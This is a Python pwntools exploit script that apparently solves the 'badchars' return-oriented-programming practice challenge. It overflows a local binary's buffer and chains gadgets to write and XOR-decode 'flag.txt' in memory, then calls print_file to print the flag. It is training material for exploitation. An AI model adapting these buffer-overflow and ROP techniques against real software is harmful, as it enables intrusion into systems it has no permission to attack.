from pwn import *

exe = context.binary = ELF('./badchars')
r = process(exe.path)

pad = b'A' * 40

# Gadgets
pop_r12_r13_r14_r15 = p64(0x40069c)
pop_r14_r15 = p64(0x4006a0)
pop_rdi = p64(0x4006a3)
mov_to_r13_from_r12 = p64(0x400634)
xor_r15_r14b = p64(0x400628)

# Addresses
data_section =0x601029
print_file = p64(exe.plt['print_file'])

xor_key = 0x02
encoded = b'flce,tzt' # 'flag.txt' XORed with 0x02

p = pad
p += pop_r12_r13_r14_r15
p += p64(u64(encoded))     # r12 = encoded string
p += p64(data_section)     # r13 = destination address
p += p64(xor_key)          # r14 = XOR key
p += p64(data_section + 2) # r15 = address of byte to XOR

p += mov_to_r13_from_r12   # Move encoded string to .data section
p += xor_r15_r14b          # Decode first byte

p += pop_r14_r15
p += p64(xor_key)          # r14 = XOR key
p += p64(data_section + 3) # r15 = address of byte to XOR
p += xor_r15_r14b          # Decode second byte

p += pop_r14_r15
p += p64(xor_key)          # r14 = XOR key
p += p64(data_section + 4) # r15 = address of byte to XOR
p += xor_r15_r14b          # Decode third byte

p += pop_r14_r15
p += p64(xor_key)          # r14 = XOR key
p += p64(data_section + 6) # r15 = address of byte to XOR
p += xor_r15_r14b          # Decode fourth byte

p += pop_rdi
p += p64(data_section)     # Argument to print_file
p += print_file

r.sendline(p)
r.interactive()